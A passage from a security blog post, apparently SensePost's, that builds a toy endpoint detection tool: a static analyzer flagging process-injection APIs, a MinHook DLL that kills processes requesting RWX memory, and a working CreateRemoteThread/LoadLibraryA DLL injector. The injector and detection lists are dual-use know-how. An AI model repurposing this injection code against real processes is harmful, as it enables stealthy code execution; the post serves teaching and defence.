(importDesc-&gt;Name != 0) {\n                const char* moduleName = (const char*)((BYTE*)hModule + importDesc-&gt;Name);\n\n                // Loop over the functions of the DLL\n                IMAGE_THUNK_DATA* thunk = (IMAGE_THUNK_DATA*)((BYTE*)hModule + importDesc-&gt;OriginalFirstThunk);\n                while (thunk-&gt;u1.AddressOfData != 0) {\n                    if (thunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG) {\n                        // printf(&quot;\\tOrdinal: %llu\\n&quot;, IMAGE_ORDINAL(thunk-&gt;u1.Ordinal));\n                    }\n                    else {\n                        IMAGE_IMPORT_BY_NAME* importByName = (IMAGE_IMPORT_BY_NAME*)((BYTE*)hModule + thunk-&gt;u1.AddressOfData);\n                        // printf(&quot;\\tFunction: %s\\n&quot;, importByName-&gt;Name);\n                        // Checks if the following functions are used by the binary\n\n                        if (strcmp(&quot;OpenProcess&quot;, importByName-&gt;Name) == 0) {\n                            isOpenProcessPresent = TRUE;\n                        }\n\n                        if (strcmp(&quot;VirtualAllocEx&quot;, importByName-&gt;Name) == 0) {\n                            isVirtualAllocExPresent = TRUE;\n                        }\n\n                        if (strcmp(&quot;WriteProcessMemory&quot;, importByName-&gt;Name) == 0) {\n                            isWriteProcessMemoryPresent = TRUE;\n                        }\n\n                        if (strcmp(&quot;CreateRemoteThread&quot;, importByName-&gt;Name) == 0) {\n                            isCreateRemoteThreadPresent = TRUE;\n                        }\n\n                    }\n                    thunk++;\n                }\n                importDesc++;\n            }\n            FreeLibrary(hModule);\n        }\n        FreeLibrary(hModule);\n    }\n\n    if (isOpenProcessPresent &amp;&amp; isVirtualAllocExPresent &amp;&amp; isWriteProcessMemoryPresent &amp;&amp; isCreateRemoteThreadPresent) {\n        return TRUE;\n    }\n    else {\n        return FALSE;\n    }\n    return FALSE;\n}\n\nBOOL lookForSeDebugPrivilegeString(const wchar_t* filename) {\n    FILE* file;\n    _wfopen_s(&amp;file, filename, L&quot;rb&quot;);\n    if (file != NULL) {\n        fseek(file, 0, SEEK_END);\n        long file_size = ftell(file);\n        rewind(file);\n        char* buffer = (char*)malloc(file_size);\n        if (buffer != NULL) {\n            if (fread(buffer, 1, file_size, file) == file_size) {\n                const char* search_string = &quot;SeDebugPrivilege&quot;;\n                size_t search_length = strlen(search_string);\n                int i, j;\n                int found = 0;\n                for (i = 0; i &lt;= file_size - search_length; i++) {\n                    for (j = 0; j &lt; search_length; j++) {\n                        if (buffer[i + j] != search_string[j]) {\n                            break;\n                        }\n                    }\n                    if (j == search_length) {\n                        return TRUE;\n                    }\n                }\n            }\n            free(buffer);\n        }\n        fclose(file);\n    }\n    return FALSE;\n}\n\nint main() {\n    LPCWSTR pipeName = L&quot;\\\\\\\\.\\\\pipe\\\\dumbedr-analyzer&quot;;\n    DWORD bytesRead = 0;\n    wchar_t target_binary_file[MESSAGE_SIZE] = { 0 };\n\n    printf(&quot;Launching analyzer named pipe server\\n&quot;);\n\n    // Creates a named pipe\n    HANDLE hServerPipe = CreateNamedPipe(\n        pipeName,                 // Pipe name to create\n        PIPE_ACCESS_DUPLEX,       // Whether the pipe is supposed to receive or send data (can be both)\n        PIPE_TYPE_MESSAGE,        // Pipe mode (whether or not the pipe is waiting for data)\n        PIPE_UNLIMITED_INSTANCES, // Maximum number of instances from 1 to PIPE_UNLIMITED_INSTANCES\n        MESSAGE_SIZE,             // Number of bytes for output buffer\n        MESSAGE_SIZE,             // Number of bytes for input buffer\n        0,                        // Pipe timeout \n        NULL                      // Security attributes (anonymous connection or may be needs credentials. )\n    );\n\n    while (TRUE) {\n\n        // ConnectNamedPipe enables a named pipe server to start listening for incoming connections\n        BOOL isPipeConnected = ConnectNamedPipe(\n            hServerPipe, // Handle to the named pipe\n            NULL         // Whether or not the pipe supports overlapped operations\n        );\n\n        wchar_t target_binary_file[MESSAGE_SIZE] = { 0 };\n        if (isPipeConnected) {\n            // Read from the named pipe\n            ReadFile(\n                hServerPipe,         // Handle to the named pipe\n                &amp;target_binary_file, // Target buffer where to stock the output\n                MESSAGE_SIZE,        // Size of the buffer\n                &amp;bytesRead,          // Number of bytes read from ReadFile\n                NULL                 // Whether or not the pipe supports overlapped operations\n            );\n\n            printf(&quot;~&gt; Received binary file %ws\\n&quot;, target_binary_file);\n            int res = 0;\n\n            BOOL isSeDebugPrivilegeStringPresent = lookForSeDebugPrivilegeString(target_binary_file);\n            if (isSeDebugPrivilegeStringPresent == TRUE) {\n                printf(&quot;\\t\\033[31mFound SeDebugPrivilege string.\\033[0m\\n&quot;);\n            }\n            else {\n                printf(&quot;\\t\\033[32mSeDebugPrivilege string not found.\\033[0m\\n&quot;);\n            }\n\n            BOOL isDangerousFunctionsFound = ListImportedFunctions(target_binary_file);\n            if (isDangerousFunctionsFound == TRUE) {\n                printf(&quot;\\t\\033[31mDangerous functions found.\\033[0m\\n&quot;);\n            }\n            else {\n                printf(&quot;\\t\\033[32mNo dangerous functions found.\\033[0m\\n&quot;);\n            }\n\n            BOOL isSigned = VerifyEmbeddedSignature(target_binary_file);\n            if (isSigned == TRUE) {\n                printf(&quot;\\t\\033[32mBinary is signed.\\033[0m\\n&quot;);\n            }\n            else {\n                printf(&quot;\\t\\033[31mBinary is not signed.\\033[0m\\n&quot;);\n            }\n\n            wchar_t response[MESSAGE_SIZE] = { 0 };\n            if (isSigned == TRUE) {\n                swprintf_s(response, MESSAGE_SIZE, L&quot;OK\\0&quot;);\n                printf(&quot;\\t\\033[32mStaticAnalyzer allows\\033[0m\\n&quot;);\n            }\n            else {\n                // If the following conditions are met, the binary is blocked\n                if (isDangerousFunctionsFound || isSeDebugPrivilegeStringPresent) {\n                    swprintf_s(response, MESSAGE_SIZE, L&quot;KO\\0&quot;);\n                    printf(&quot;\\n\\t\\033[31mStaticAnalyzer denies\\033[0m\\n&quot;);\n                }\n                else {\n                    swprintf_s(response, MESSAGE_SIZE, L&quot;OK\\0&quot;);\n                    printf(&quot;\\n\\t\\033[32mStaticAnalyzer allows\\033[0m\\n&quot;);\n                }\n            }\n\n            DWORD bytesWritten = 0;\n            // Write to the named pipe\n            WriteFile(\n                hServerPipe,   // Handle to the named pipe\n                response,      // Buffer to write from\n                MESSAGE_SIZE,  // Size of the buffer \n                &amp;bytesWritten, // Numbers of bytes written\n                NULL           // Whether or not the pipe supports overlapped operations\n            );\n\n        }\n\n        // Disconnect\n        DisconnectNamedPipe(\n            hServerPipe // Handle to the named pipe\n        );\n\n        printf(&quot;\\n\\n&quot;);\n    }\n    return 0;\n}</code></pre>\n\n\n\n<p>Pretty simple. The remote injector agent will be a little bit more complicated!</p>\n\n\n\n<h4 class=\"wp-block-heading\">2/ The remote injector</h4>\n\n\n\n<p>One thing EDR&#x2019;s like to do is to apply a mechanism called function hooking.</p>\n\n\n\n<p>As we have seen before, and because of PatchGuard, it is not possible to modify the SSDT or any other critical kernel structures anymore. So what anti-virus editors thought of is to instead modify the NTDLL.dll directly. Since it is the last building block before entering kernel space, and since it is the user mode reflection of the kernel itself, if a defender is able to analyse the parameters sent to the functions exposed by the NTDLL.dll, they will be able to dynamically analyse if these function calls are legitimate or malicious. To do so, EDR&#x2019;s simply temporarily redirect code flow from NTDLL.dll functions to their own code:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/edrredirect.png\"><img loading=\"lazy\" decoding=\"async\" width=\"552\" height=\"446\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/edrredirect.png\" alt=\"\" class=\"wp-image-67731\"></a></figure></div>\n\n\n<p>The question is, how do you redirect code flow from NTDLL.dll? When a process is created, it loads a copy of a few necessary DLL&#x2019;s. Obviously, a copy of NTDLL.dll is made and, if we are skilled enough, we can modify its content. To modify the flow of a function from NTDLL.dll, we simply need to parse the DLL, find the functions we want to hook and modify its code so that it jumps to the code of our EDR instead.</p>\n\n\n\n<p>Easy in theory. A lot harder in practice. Thankfully there is an insane library called <a href=\"https://github.com/TsudaKageyu/minhook\">MinHook</a>, developed by TsudaKageyu, that will allow us to achieve our hooking goal quite easily. Using the MinHook library we are going to build a DLL that the remote injector agent will inject into each and every process that is created. This DLL will only hook one function from the NTDLL.dll: NtAllocateVirtualMemory. Why this function? Because the NtAllocateVirtualMemory is the function from NTDLL.dll that is used to allocate and protect a memory space. Since our EDR will focus on detecting tools that injects shellcode remotely, this function is the most important one to monitor.</p>\n\n\n\n<p>Below you will find the commented code of the DLL that we will inject (thankfully it includes usage of minhook):</p>\n\n\n\n<pre class=\"wp-block-code\"><code>\n#include &quot;pch.h&quot;\n#include &quot;minhook/include/MinHook.h&quot;\n\n\n// Defines the prototype of the NtAllocateVirtualMemoryFunction\ntypedef DWORD(NTAPI* pNtAllocateVirtualMemory)(\n    HANDLE ProcessHandle,\n    PVOID* BaseAddress,\n    ULONG_PTR ZeroBits,\n    PSIZE_T RegionSize,\n    ULONG AllocationType,\n    ULONG Protect\n    );\n\n// Pointer to the trampoline function used to call the original NtAllocateVirtualMemory\npNtAllocateVirtualMemory pOriginalNtAllocateVirtualMemory = NULL;\n\n// This is the function that will be called whenever the injected process calls \n// NtAllocateVirtualMemory. This function takes the arguments Protect and checks\n// if the requested protection is RWX (which shouldn&apos;t happen).\nDWORD NTAPI NtAllocateVirtualMemory(\n    HANDLE ProcessHandle, \n    PVOID* BaseAddress, \n    ULONG_PTR ZeroBits, \n    PSIZE_T RegionSize, \n    ULONG AllocationType, \n    ULONG Protect\n) {\n\n    // Checks if the program is trying to allocate some memory and protect it with RWX \n    if (Protect == PAGE_EXECUTE_READWRITE) {\n        // If yes, we notify the user and terminate the process\n        MessageBox(NULL, L&quot;Dude, are you trying to RWX me ?&quot;, L&quot;Found u bro&quot;, MB_OK);\n        TerminateProcess(GetCurrentProcess(), 0xdeadb33f);\n    }\n\n    //If no, we jump on the originate NtAllocateVirtualMemory\n    return pOriginalNtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);\n}\n\n// This function initializes the hooks via the MinHook library\nDWORD WINAPI InitHooksThread(LPVOID param) {\n    if (MH_Initialize() != MH_OK) {\n        return -1;\n    }\n\n    // Here we specify which function from wich DLL we want to hook\n    MH_CreateHookApi(   \n        L&quot;ntdll&quot;,                                     // Name of the DLL containing the function to  hook\n        &quot;NtAllocateVirtualMemory&quot;,                    // Name of the function to hook\n        NtAllocateVirtualMemory,                      // Address of the function on which to jump when hooking \n        (LPVOID *)(&amp;pOriginalNtAllocateVirtualMemory) // Address of the original NtAllocateVirtualMemory function\n    );\n\n    // Enable the hook on NtAllocateVirtualMemory\n    MH_STATUS status = MH_EnableHook(MH_ALL_HOOKS);\n    return status;\n}\n\n// Here is the DllMain of our DLL\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){\n    switch (ul_reason_for_call){\n    case DLL_PROCESS_ATTACH: {\n        // This DLL will not be loaded by any thread so we simply disable DLL_TRHEAD_ATTACH and DLL_THREAD_DETACH\n        DisableThreadLibraryCalls(hModule);\n\n        // Calling WinAPI32 functions from the DllMain is a very bad practice \n        // since it can basically lock the program loading the DLL\n        // Microsoft recommends not using any functions here except a few one like \n        // CreateThread IF AND ONLY IF there is no need for synchronization\n        // So basically we are creating a thread that will execute the InitHooksThread function \n        // thus allowing us hooking the NtAllocateVirtualMemory function\n        HANDLE hThread = CreateThread(NULL, 0, InitHooksThread, NULL, 0, NULL);\n        if (hThread != NULL) {\n            CloseHandle(hThread);\n        }\n        break;\n    }\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}</code></pre>\n\n\n\n<p>With the DLL created, we need to inject it into every process we want to monitor. That&#x2019;s the job of the RemoteInjector agent which receives, from the driver, the PID of the process in which to inject the DLL:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>\n#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n\n#define MESSAGE_SIZE 2048\n#define MAX_PATH 260\n\nint main() {\n    LPCWSTR pipeName = L&quot;\\\\\\\\.\\\\pipe\\\\dumbedr-injector&quot;;\n    DWORD bytesRead = 0;\n    wchar_t target_binary_file[MESSAGE_SIZE] = { 0 };\n\n    char dll_path[] = &quot;x64\\\\Debug\\\\MyDumbEDRDLL.dll&quot;;\n    char dll_full_path[MAX_PATH];\n    GetFullPathNameA(dll_path, MAX_PATH, dll_full_path, NULL);\n    printf(&quot;Launching injector named pipe server, injecting %s\\n&quot;, dll_full_path);\n\n\n    // Creates a named pipe\n    HANDLE hServerPipe = CreateNamedPipe(\n        pipeName,                 // Pipe name to create\n        PIPE_ACCESS_DUPLEX,       // Whether the pipe is supposed to receive or send data (can be both)\n        PIPE_TYPE_MESSAGE,        // Pipe mode (whether or not the pipe is waiting for data)\n        PIPE_UNLIMITED_INSTANCES, // Maximum number of instances from 1 to PIPE_UNLIMITED_INSTANCES\n        MESSAGE_SIZE,             // Number of bytes for output buffer\n        MESSAGE_SIZE,             // Number of bytes for input buffer\n        0,                        // Pipe timeout \n        NULL                      // Security attributes (anonymous connection or may be needs credentials. )\n    );\n\n    while (TRUE) {\n\n        // ConnectNamedPipe enables a named pipe server to start listening for incoming connections\n        BOOL isPipeConnected = ConnectNamedPipe(\n            hServerPipe, // Handle to the named pipe\n            NULL         // Whether or not the pipe supports overlapped operations\n        );\n\n        wchar_t message[MESSAGE_SIZE] = { 0 };\n        \n        if (isPipeConnected) {\n\n            // Read from the named pipe\n            ReadFile(\n                hServerPipe,  // Handle to the named pipe\n                &amp;message,     // Target buffer where to stock the output\n                MESSAGE_SIZE, // Size of the buffer\n                &amp;bytesRead,   // Number of bytes read from ReadFile\n                NULL          // Whether or not the pipe supports overlapped operations\n            );\n\n            // Casting the message into a DWORD\n            DWORD target_pid = _wtoi(message);\n            printf(&quot;~&gt; Received process id %d\\n&quot;, target_pid);\n\n            // Opening the process with necessary privileges \n            HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, target_pid);\n            if (hProcess == NULL) {\n                printf(&quot;Can&apos;t open handle, error: % lu\\n&quot;, GetLastError());\n                return FALSE;\n            }\n            printf(&quot;\\tOpen handle on PID: %d\\n&quot;, target_pid);\n\n            // Looking for the LoadLibraryA function in the kernel32.dll\n            FARPROC loadLibAddress = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);\n            if (loadLibAddress == NULL) {\n                printf(&quot;Could not find LoadLibraryA, error: %lu\\n&quot;, GetLastError());\n                return FALSE;\n            }\n            printf(&quot;\\tFound LoadLibraryA function\\n&quot;);\n\n            // Allocating some memory wth read/write privileges\n            LPVOID vae_buffer;\n            vae_buffer = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n            if (vae_buffer == NULL){\n                printf(&quot;Can&apos;t allocate memory, error: %lu\\n&quot;, GetLastError());\n                CloseHandle(hProcess);\n                return FALSE;\n            }\n            printf(&quot;\\tAllocated: %d bytes\\n&quot;, MAX_PATH);\n\n            // Writing the path of the DLL to inject: x64\\Debug\\MyDumbEDRDLL.dll\n            SIZE_T bytesWritten;\n            if (!WriteProcessMemory(hProcess, vae_buffer, dll_full_path, MAX_PATH, &amp;bytesWritten)) {\n                printf(&quot;Can&apos;t write into memory, error: %lu\\n&quot;, GetLastError());\n                VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);\n                CloseHandle(hProcess);\n                return FALSE;\n            }\n            printf(&quot;\\tWrote %zu in %d process memory\\n&quot;, bytesWritten, target_pid);\n\n            // Creating a thread that will call LoadLibraryA and the path of the MyDUMBEDRDLL to load as argument\n            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddress, vae_buffer, 0, NULL);\n            if (hThread == NULL) {\n                printf(&quot;Can&apos;t launch remote thread, error: %lu\\n&quot;, GetLastError());\n                VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);\n                CloseHandle(hProcess);\n                return FALSE;\n            }\n            printf(&quot;\\tLaunched remote thread\\n&quot;);\n\n            // Freeing allocated memory as well as handles\n            VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);\n            CloseHandle(hThread);\n            CloseHandle(hProcess);\n            printf(&quot;\\tClosed handle\\n&quot;);\n\n            wchar_t response[MESSAGE_SIZE] = { 0 };\n            swprintf_s(response, MESSAGE_SIZE, L&quot;OK\\0&quot;);\n            DWORD pipeBytesWritten = 0;\n            \n            // Inform the driver that the injection was successful\n            WriteFile(\n                hServerPipe,       // Handle to the named pipe\n                response,          // Buffer to write from\n                MESSAGE_SIZE,      // Size of the buffer \n                &amp;pipeBytesWritten, // Numbers of bytes written\n                NULL               // Whether or not the pipe supports overlapped operations\n            );\n\n            // Disconnect\n            DisconnectNamedPipe(\n                hServerPipe // Handle to the named pipe\n            );\n\n            printf(&quot;\\n\\n&quot;);        \n        }\n    }\n}</code></pre>\n\n\n\n<p>Running all of that, we can see that the assembly code of the NtAllocateVirtualMemory function of the NTDLL.dll of a process that was injected is the following:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/ntallocatevirtualmemorywithjmp.png\"><img loading=\"lazy\" decoding=\"async\" width=\"812\" height=\"233\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/ntallocatevirtualmemorywithjmp.png\" alt=\"\" class=\"wp-image-67732\"></a></figure></div>\n\n\n<p>While a more legitimate disassembled code should look like this:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/ntallocatevirtualmemorywihtoutjmp.png\"><img loading=\"lazy\" decoding=\"async\" width=\"740\" height=\"168\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/ntallocatevirtualmemorywihtoutjmp.png\" alt=\"\" class=\"wp-image-67733\"></a></figure></div>\n\n\n<p>As you can see the first assembly instruction of the hooked NtAllocateVirtualMemory function is a jmp which will redirect the code flow from the NTDLL.dll to the address &#x201C;00007FFAA06A0FD6&#x201D; which is&#x2026; Our injected EDR&#x2019;s DLL:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/jmpfromntdlltoedr.png\"><img loading=\"lazy\" decoding=\"async\" width=\"955\" height=\"166\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/jmpfromntdlltoedr.png\" alt=\"\" class=\"wp-image-67734\"></a></figure></div>\n\n\n<p>At this point our EDR is fully functional! Let&#x2019;s test it!</p>\n\n\n\n<h2 class=\"wp-block-heading\">VIII/ MyDumbEDR demo</h2>\n\n\n\n<p>Now that we have our two agents as well as the driver, we can compile them and launch the entire project to see it in action!</p>\n\n\n\n<p>To simplify the launching of the entire EDR solution, I created a small batch script whose contents are the following:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>// Launches the kernel driver\nsc create mydumbedr type=kernel binpath=Z:\\windev\\MyDumbEDR\\x64\\Debug\\MyDumbEDRDriver.sys\nsc start mydumbedr\n// Starts the StaticAnalyzer agent\nstart cmd.exe /c Z:\\windev\\MyDumbEDR\\x64\\Debug\\MyDumbEDRStaticAnalyzer.exe\n// Starts the RemoteInjector agent \nstart cmd.exe /c Z:\\windev\\MyDumbEDR\\x64\\Debug\\MyDumbEDRRemoteInjector.exe \n// Starts dbgview.exe\nstart dbgview.exe\n\necho EDR&apos;s running, press any key to stop it\npause\n\n// Kills both agents and unloads the kernel driver\ntaskkill /F /IM MyDumbEDRStaticAnalyzer.exe \ntaskkill /F /IM MyDumbEDRRemoteInjector.exe\nsc stop mydumbedr\nsc delete mydumbedr</code></pre>\n\n\n\n<p>Let&#x2019;s run the EDR, open a notepad process that will be the target of the shellcode injection and run the ShellcodeInjector binary to see how the EDR works in live action:</p>\n\n\n\n<iframe style=\"aspect-ratio: 16 / 9; height: auto; width: 100%;\" src=\"https://www.youtube.com/embed/iqcttCwX7kc?si=ufv3xyoea54KXHnI\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen></iframe>\n\n\n\n<p>As you can see, the StaticAnalyzer agent detected that the binary was malicious. The RemoteInjector injected the MyDumbEDRDLL into the malicious process and when it tried to allocate a memory page with RWX to write and execute the shellcode, the EDR detected it and terminated the process thus protecting the notepad.exe process.</p>\n\n\n\n<p>As such, we can say that our EDR is strong enough to detect both statically and dynamically malicious binaries trying to remotely inject shellcode!</p>\n\n\n\n<h2 class=\"wp-block-heading\">IX/ Conclusion</h2>\n\n\n\n<p>Throughout this article we have seen how to develop a Windows driver, how to turn it into a EDR&#x2019;s kernel driver and how to build a dummy EDR.</p>\n\n\n\n<p>There are 3 reasons why I wanted to create such a thing. First I wanted to better understand how EDR&#x2019;s are architected so that I can learn how to analyse the ones I&#x2019;m fighting against during assessments.</p>\n\n\n\n<p>Second, I wanted to do this research to provide an article that can be used by anyone that like me, wants to understand how EDR&#x2019;s work and give them a few ideas about how you can bypass one. For that reason, I&#x2019;m leaving you with a challenge: bypass MyDumbEDR. In the <a href=\"https://github.com/sensepost/mydumbedr\">following repo</a> you will find the source code of the EDR created in this blogpost as well as instructions to &#x201C;capture the flag&#x201D;. There are multiple ways you can bypass it, so I encourage you to read the code closely. I implemented some stupid logic that IS actually used by some EDR&#x2019;s.</p>\n\n\n\n<p>The last reason I wanted to work on building my EDR was to see how complicated it is to create a functional one. As pentesters, and red teamers, we are used to saying things like &#x201C;Haha this EDR is terrible, I bypassed it easily&#x201D;. Yeah you did, congrats. But remember that building a security product that is able to both detect malicious behaviours and not create too much false positives is a pain. As such, I&#x2019;d like to finish this article by giving a huge thumbs up to both security product developers as well as blue teamers that are messing with the red&#x2019;s during our assessments!</p>\n\n\n\n<p>Happy hacking folks!</p>\n\n\n\n<p>This is a cross-post from:&#xA0;<a href=\"https://blog.whiteflag.io/blog/from-windows-drivers-to-a-almost-fully-working-edr/\">https://blog.whiteflag.io/blog/from-windows-driver-to-a-almost-fully-working-edr/</a>.</p>\n",
      "content:encodedSnippet": "TL;DR I wanted to better understand EDR’s so I built a dummy EDR and talk about it here. \nEDR (Endpoint Detection and Response) is a kind of security product that aims to detect abnormal activities being executed on a computer or a server.\nWhen looking for resources about how EDR’s work, I realised that, even if there is a lot of literature available about EDR’s, there aren’t many articles explaining how an EDR’s is architected and how the different components of a EDR are orchestrated. This article aims to demystify how EDR’s work while building a custom one that will implement a few techniques used by real EDR’s.\nFirst we will take a look at the history of anti-viruses, see how they worked and why they relied on a kernel driver, then we will see how to create a custom kernel driver and finally how to turn it into a almost fully working EDR.\nI/ Virus history\nIf we take a look at the timeline of computer viruses and worms we’ll learn that that the term “worm” was originally used by John von Neumann in an article called “Theory of self-reproducing automata” published in 1966. In this article, Neumann showed that, in theory, a program could be designed so that it is able to reproduce itself. For this work, Neumann was considered to be the theoretical “father” of computer virology.\nThe first ever working virus was called “The Creeper” and was created by Bob Thomas. This was the first known worm as it was able to replicate over the network (ARPANET) copying itself to remote systems. Although it is the first detected virus ever, its actions were benign since it only printed the message “I’M THE CREEPER. CATCH ME IF YOU CAN”:\n\nKnowing that such programs could be created, smart people started working on security products that would be able to remove them. For example the “Reaper” whose only purposes was to delete the Creeper from infected hosts by moving across the ARPANET. Technically the Reaper was a worm itself, but a good one sort of… This was the first anti-virus software but a lot more appeared in the late 1980s and they were all aiming the same goal: protecting computers from malware.\nII/ How did anti-virus protect computers ?\nBack in the 90s, antivirus products were able to detect viruses in two ways:\nVia a simple heuristics:\nWhat is the name of the binary ?\nWhat is in the metadata (strings, comments…)\n2. Via a signature which is calculated for each binary:\n\nWhen dropping the binary on disk, the anti-virus would check if its signature was known and categorised as malicious. If so, the binary was quarantined or deleted.\nFor obvious reasons this was not enough because all of these detection methods are based on information that an attacker can manipulate. If you are blocking binaries called mimikatz.exe, I will just rename it notmimikatz.exe. If you are blocking binaries that contain a specific string, I will strip it! If you are flagging the signature of the binary, I’ll change one byte in the binary and we are good to go. Static analysis was not enough.\nIn order to detect viruses in a more sophisticated way, it was necessary to be able to analyse the system dynamically and specifically be aware of:\nProcesses being created\nLibraries being loaded\nFiles being modified\nFunctions being called as well as the parameters they take\nIf we take a look at how operating systems are architected, we can see that they rely on two spaces:\n\nThe user space is where your processes live, where you manipulate a word file, where you call your friends on discord. Each process, running in the user space, has got its own execution environment which means that if discord crashes, word will still work. On the other side is the kernel space where the core of the operating system as well as services and drivers are running. Since the kernel space is where the kernel itself is running, it contains quite a bit of interesting information, stored in structures, useful to inspect. However, as you may have guesses, it is not possible for a user space program to access this information directly since the user space and kernel space are both isolated from each other:\n\nThe only way of accessing these specific structures directly is running code in the kernel space itself and the easiest way of doing that, is via a kernel driver.\n\nOne of the most heavily targeted structures was the SSDT (Service System Dispatch Table). To understand why, we need to take a look at what the operating system does when you try to open a file. As a user, opening a file is nothing exceptional, you just double click on the file and a program (let’s say notepad or word) would open the file for you. However in order to achieve such a task, the operating system had to go through quite a few steps which is described by the following schema:\n\nAs you can see, user applications mostly rely on the WinAPI which consists of a set of developper-friendly functions documented by Microsoft and exposed by multiple DLL’s such as kernel32.dll, user.dll or advapi.dll. So the first step to open a file, is to use the CreateFileA function exposed by the kernel32.dll, whose prototype is the following:\nHANDLE CreateFileA(\n    LPCSTR                lpFileName,\n    DWORD                 dwDesiredAccess,\n    DWORD                 dwShareMode,\n    LPSECURITY_ATTRIBUTES lpSecurityAttributes,\n    DWORD                 dwCreationDisposition,\n    DWORD                 dwFlagsAndAttributes,\n    HANDLE                hTemplateFile\n);\nIts usage is fully documented and the function is pretty easy to use, all you need to do is to specify the path to the file you want to open as well as the desired access on it (read, write or append). Looking at the execution flow of the CreateFileA function we’ll see that, ultimately, it will call another function, NtCreateFile, exposed by the NTDLL.dll and whose prototype is the following:\n__kernel_entry NTSTATUS NtCreateFile(\n    PHANDLE            FileHandle,\n    ACCESS_MASK        DesiredAccess,\n    POBJECT_ATTRIBUTES ObjectAttributes,\n    PIO_STATUS_BLOCK   IoStatusBlock,\n    PLARGE_INTEGER     AllocationSize,\n    ULONG              FileAttributes,\n    ULONG              ShareAccess,\n    ULONG              CreateDisposition,\n    ULONG              CreateOptions,\n    PVOID              EaBuffer,\n    ULONG              EaLength\n);\nAs you can see, the prototype of the NtCreateFile function is much more complicated than the one of the CreateFileA function. The reason is that the NTDLL.dll is in fact the user mode reflection of the functions exposed by the kernel itself. As such, the NTDLL.dll is going to add a few others parameters that are needed by the kernel to perform the task of opening a file which are not managed or controlled by the developer.\nOnce all these parameters are set, the program will have to request the kernel to open the file. That means that the program will have to call the NtCreateFile function exposed by the kernel itself. At the beginning of this article I mentioned that a user space process can not directly access the kernel space, and that is true! However they can request the kernel to perform specific tasks. To request an such action, you will need to trigger a specific mechanism called a system call.\nLooking at the disassembly of the NtCreateFile from the NTDLL.dll function we can see the following:\n\nTwo things are important. The first one is the second line:\nmov eax, 55h\nThis line moves the value 55 in the EAX register. This value, 55, is called a system call number. Each function from the NTDLL.dll is linked to a specific system call number that varies between the different version of the Windows operating system. The second important line is the syscall instruction itself:\nsyscall\nThis instruction is the one that will tell the CPU to switch from the user space to the kernel space and then jump on the kernel address where the NtCreateFile function is located in the kernel. The thing is, the CPU doesn’t know where the NtCreateFile function is located. In order to find the address of the function, it will need both the system call number, stored in the EAX register, and the SSDT. Why the SSDT ? Because this structure is an index that contains a list of system call numbers as well as the location of the corresponding hexadecimal address of the function in the kernel:\n\nFunctionSystem call numberKernel address pointer\nNtCreateFile550x5ea54623\nNtCreateIRTimerab0x6bcd1576\n………\n\n\n\n\n\nSo when the CPU triggers the syscall, it looks into this structure for the syscall number 55 and jumps on the address linked to this system call number. The following schema sums up the entire process of opening a file on the Windows operating system:\n\nOnce the kernel receives the request, it will request a driver (the hard disk driver in our case) to read the content of the file stored on the hard disk which, in the end, will allow notepad to print its content back to you.\nLooking back at the SSDT, it appears that if you modify the address of the kernel functions, you can basically redirect the code flow pretty much anywhere you want. For that reason security tool authors started patching the SSDT in order to redirect calls to their own drivers so that they can analyse which functions are called together with their arguments:\n\nThis way, leveraging their own drivers, defenders were able to analyse system calls and determine whether or not it is legitimate or malicious.\nThe SSDT structure is simple, making manipulation of it relatively safe. However, modifying other more complicated kernel structures can be a perilous task. In kernel space, if the code you run is bugged, the entire kernel may crash. Moreover, if the code contains a logic bug or memory-based vulnerability (such as a stack overflow), an attacker could exploit them in order to run code directly in kernel space (as the most privileged user on the system). Lastly, if defenders are able to use kernel drivers to access the kernel and modify its behaviour, so can attackers with rootkits.\nIn order to protect the Operating System both from intrusive modifications made by an anti-virus and from attackers, Microsoft created KPP (Kernel Patch Protection) more commonly referred to as PatchGuard and released it with Windows XP/2003.\nPatchGuard is an active security mechanism that periodically checks the state of multiple critical Windows kernel structures. If one of these structures are modified by anything other than legitimate kernel code then PatchGuard emits a fatal system error (know as “bug check”) which will trigger a reboot of the computer:\n\nAs a result, PatchGuard was 